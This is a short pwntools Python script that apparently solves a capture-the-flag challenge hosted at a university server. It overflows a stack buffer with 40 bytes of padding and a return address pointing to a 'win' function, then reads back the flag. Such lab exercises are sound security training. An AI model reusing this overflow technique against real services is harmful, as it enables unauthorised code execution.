from pwn import *
from Crypto.Util.number import long_to_bytes, bytes_to_long

REMOTE = True

IP_ADDRESS = "cyberchallenge.disi.unitn.it"
PORT = 9002

if(REMOTE):
    conn = remote(IP_ADDRESS, PORT)
else:
    conn = process('./bin')
    #conn = gdb.debug('./bin')

# offset = pwm cyclic --offset=kaaalaaamaaanaa
offset = 40

# win function address, obtained from "p win" on GDB
function = 0x0000000000401186

payload = b'A' * offset + p64(function)
print(payload)

conn.recvuntil(b"?")
conn.sendline(payload)

conn.recvuntil(b"flag: ")
flag = conn.recvline().decode()

conn.close()
print(flag)